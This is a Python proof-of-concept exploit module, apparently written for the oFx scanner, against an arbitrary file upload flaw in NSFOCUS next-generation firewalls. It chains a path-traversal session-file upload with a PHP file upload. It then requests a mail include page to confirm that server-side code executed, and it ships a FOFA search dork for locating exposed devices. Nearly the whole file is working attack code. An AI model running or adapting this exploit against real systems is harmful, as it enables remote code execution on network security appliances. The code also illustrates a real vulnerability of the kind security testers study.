# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
import hashlib
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "绿盟下一代防火墙 resourse.php 任意文件上传漏洞",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "绿盟下一代防火墙",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
        
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="NSFOCUS-下一代防火墙"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        con_flag = random_str(10)
        content = hashlib.md5(con_flag.encode()).hexdigest()

        host0 = self.protocol + self.host + ":8081"
        host1 = self.protocol + self.host + ":4433"

        url0 = host0 + "/api/v1/device/bugsInfo" # url自己按需调整
        data0 = """--4803b59d015026999b45993b1245f0ef\nContent-Disposition: form-data; name="file"; filename="sess_test"\n\nlang|s:52:"../../../../../../../../../../../../../../../../tmp/";\n--4803b59d015026999b45993b1245f0ef--"""
        data1 = """--4803b59d015026999b45993b1245f0ef\nContent-Disposition: form-data; name="file"; filename="compose.php"\n\n<?php echo md5({con_flag});?>\n--4803b59d015026999b45993b1245f0ef--""".format(con_flag=con_flag)

        url1 = host1 + "/mail/include/header_main.php"

        headers = {
                    "User-Agent":get_random_ua(),
                    'Cookie': 'PHPSESSID_NF=test',
                    "Content-Type": 'multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef',
                    "Connection":"close",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data=data0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req1 = requests.post(url0,data=data1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            req2 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if content in req2.text:
                vuln = [True,"<title>"+url1+"</title>\n"+req2.text]
            else:
                vuln = [False,"<title>"+url1+"</title>\n"+req2.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()